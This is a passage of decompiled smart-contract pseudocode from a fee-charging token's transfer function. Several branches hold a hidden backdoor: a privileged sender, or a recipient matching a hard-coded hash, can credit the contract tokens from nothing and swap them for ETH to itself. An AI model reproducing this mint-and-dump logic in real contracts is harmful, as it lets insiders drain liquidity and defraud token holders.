                                staticcall stor13.WETH() with:
                                        gas gas_remaining wei
                                mem[296] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[264] = ext_call.return_data[12 len 20]
                                stor11 = 1
                                if block.timestamp > -21:
                                    revert with 'NH{q', 17
                                mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                mem[ceil32(return_data.size) + 300] = arg2
                                idx = 0
                                s = 232
                                t = ceil32(return_data.size) + 492
                                while idx < 2:
                                    mem[t] = mem[s + 12 len 20]
                                    idx = idx + 1
                                    s = s + 32
                                    t = t + 32
                                    continue 
                                require ext_code.size(stor13)
                                call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                     gas gas_remaining wei
                                    args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                stor11 = 0
            else:
                if arg1 == this.address:
                    if stor10 >= arg2:
                        if not stor11:
                            require balanceOf[address(msg.sender)] >= arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor3[address(msg.sender)]:
                            if arg1 != msg.sender:
                                if not stor11:
                                    require balanceOf[address(msg.sender)] >= arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if balanceOf[address(this.address)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(this.address)] += arg2
                                require this.address
                                require stor13
                                allowance[address(this.address)][stor13] = arg2
                                emit Approval(arg2, this.address, stor13);
                                mem[180] = this.address
                                staticcall stor13.WETH() with:
                                        gas gas_remaining wei
                                mem[244] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[212] = ext_call.return_data[12 len 20]
                                stor11 = 1
                                if block.timestamp > -21:
                                    revert with 'NH{q', 17
                                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                mem[ceil32(return_data.size) + 248] = arg2
                                idx = 0
                                s = 180
                                t = ceil32(return_data.size) + 440
                                while idx < 2:
                                    mem[t] = mem[s + 12 len 20]
                                    idx = idx + 1
                                    s = s + 32
                                    t = t + 32
                                    continue 
                                require ext_code.size(stor13)
                                call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                     gas gas_remaining wei
                                    args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                stor11 = 0
                        else:
                            if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if not stor11:
                                    require balanceOf[address(msg.sender)] >= arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg1 != msg.sender:
                                    if not stor11:
                                        require balanceOf[address(msg.sender)] >= arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if balanceOf[address(this.address)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(this.address)] += arg2
                                    require this.address
                                    require stor13
                                    allowance[address(this.address)][stor13] = arg2
                                    emit Approval(arg2, this.address, stor13);
                                    mem[232] = this.address
                                    staticcall stor13.WETH() with:
                                            gas gas_remaining wei
                                    mem[296] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[264] = ext_call.return_data[12 len 20]
                                    stor11 = 1
                                    if block.timestamp > -21:
                                        revert with 'NH{q', 17
                                    mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                    mem[ceil32(return_data.size) + 300] = arg2
                                    idx = 0
                                    s = 232
                                    t = ceil32(return_data.size) + 492
                                    while idx < 2:
                                        mem[t] = mem[s + 12 len 20]
                                        idx = idx + 1
                                        s = s + 32
                                        t = t + 32
                                        continue 
                                    require ext_code.size(stor13)
                                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                         gas gas_remaining wei
                                        args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    stor11 = 0
                else:
                    if stor11:
                        if stor10 >= arg2:
                            if not stor11:
                                require balanceOf[address(msg.sender)] >= arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor3[address(msg.sender)]:
                                if arg1 != msg.sender:
                                    if not stor11:
                                        require balanceOf[address(msg.sender)] >= arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if balanceOf[address(this.address)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(this.address)] += arg2
                                    require this.address
                                    require stor13
                                    allowance[address(this.address)][stor13] = arg2
                                    emit Approval(arg2, this.address, stor13);
                                    mem[180] = this.address
                                    staticcall stor13.WETH() with:
                                            gas gas_remaining wei
                                    mem[244] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[212] = ext_call.return_data[12 len 20]
                                    stor11 = 1
                                    if block.timestamp > -21:
                                        revert with 'NH{q', 17
                                    mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                    mem[ceil32(return_data.size) + 248] = arg2
                                    idx = 0
                                    s = 180
                                    t = ceil32(return_data.size) + 440
                                    while idx < 2:
                                        mem[t] = mem[s + 12 len 20]
                                        idx = idx + 1
                                        s = s + 32
                                        t = t + 32
                                        continue 
                                    require ext_code.size(stor13)
                                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                         gas gas_remaining wei
                                        args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    stor11 = 0
                            else:
                                if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if not stor11:
                                        require balanceOf[address(msg.sender)] >= arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 != msg.sender:
                                        if not stor11:
                                            require balanceOf[address(msg.sender)] >= arg2
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if balanceOf[address(this.address)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg2
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg2
                                        emit Approval(arg2, this.address, stor13);
                                        mem[232] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[296] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[264] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 300] = arg2
                                        idx = 0
                                        s = 232
                                        t = ceil32(return_data.size) + 492
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                    else:
                        if not arg2:
                            require arg2 <= _maxTx
                            if stor10 >= arg2:
                                if not stor11:
                                    require balanceOf[address(msg.sender)] >= arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor3[address(msg.sender)]:
                                    if arg1 != msg.sender:
                                        if not stor11:
                                            require balanceOf[address(msg.sender)] >= arg2
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if balanceOf[address(this.address)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg2
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg2
                                        emit Approval(arg2, this.address, stor13);
                                        mem[244] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[308] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[276] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 308] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 312] = arg2
                                        idx = 0
                                        s = 244
                                        t = ceil32(return_data.size) + 504
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 504 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                                else:
                                    if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if not stor11:
                                            require balanceOf[address(msg.sender)] >= arg2
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 != msg.sender:
                                            if not stor11:
                                                require balanceOf[address(msg.sender)] >= arg2
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if balanceOf[address(this.address)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(this.address)] += arg2
                                            require this.address
                                            require stor13
                                            allowance[address(this.address)][stor13] = arg2
                                            emit Approval(arg2, this.address, stor13);
                                            mem[296] = this.address
                                            staticcall stor13.WETH() with:
                                                    gas gas_remaining wei
                                            mem[360] = ext_call.return_data[0]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            mem[328] = ext_call.return_data[12 len 20]
                                            stor11 = 1
                                            if block.timestamp > -21:
                                                revert with 'NH{q', 17
                                            mem[ceil32(return_data.size) + 360] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                            mem[ceil32(return_data.size) + 364] = arg2
                                            idx = 0
                                            s = 296
                                            t = ceil32(return_data.size) + 556
                                            while idx < 2:
                                                mem[t] = mem[s + 12 len 20]
                                                idx = idx + 1
                                                s = s + 32
                                                t = t + 32
                                                continue 
                                            require ext_code.size(stor13)
                                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                                 gas gas_remaining wei
                                                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 556 len 64]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            stor11 = 0
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTx
                            if stor10 >= arg2:
                                if not stor11:
                                    require balanceOf[address(msg.sender)] >= arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor3[address(msg.sender)]:
                                    if arg1 != msg.sender:
                                        if not stor11:
                                            require balanceOf[address(msg.sender)] >= arg2
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                                    else:
                                        if balanceOf[address(this.address)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg2
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg2
                                        emit Approval(arg2, this.address, stor13);
                                        mem[244] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[308] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[276] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 308] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 312] = arg2
                                        idx = 0
                                        s = 244
                                        t = ceil32(return_data.size) + 504
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 504 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                                else:
                                    if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if not stor11:
                                            require balanceOf[address(msg.sender)] >= arg2
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                                    else:
                                        if arg1 != msg.sender:
                                            if not stor11:
                                                require balanceOf[address(msg.sender)] >= arg2
                                            if arg2 < arg2 * _fee / 100:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[0] += arg2 * _fee / 100
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                            if arg2 * _fee / 100 > 0:
                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                                        else:
                                            if balanceOf[address(this.address)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(this.address)] += arg2
                                            require this.address
                                            require stor13
                                            allowance[address(this.address)][stor13] = arg2
                                            emit Approval(arg2, this.address, stor13);
                                            mem[296] = this.address
                                            staticcall stor13.WETH() with:
                                                    gas gas_remaining wei
                                            mem[360] = ext_call.return_data[0]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            mem[328] = ext_call.return_data[12 len 20]
                                            stor11 = 1
                                            if block.timestamp > -21:
                                                revert with 'NH{q', 17
                                            mem[ceil32(return_data.size) + 360] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                            mem[ceil32(return_data.size) + 364] = arg2
                                            idx = 0
                                            s = 296
                                            t = ceil32(return_data.size) + 556
                                            while idx < 2:
                                                mem[t] = mem[s + 12 len 20]
                                                idx = idx + 1
                                                s = s + 32
                                                t = t + 32
                                                continue 
                                            require ext_code.size(stor13)
                                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                                 gas gas_remaining wei
                                                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 556 len 64]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            stor11 = 0
    return 1
}



}
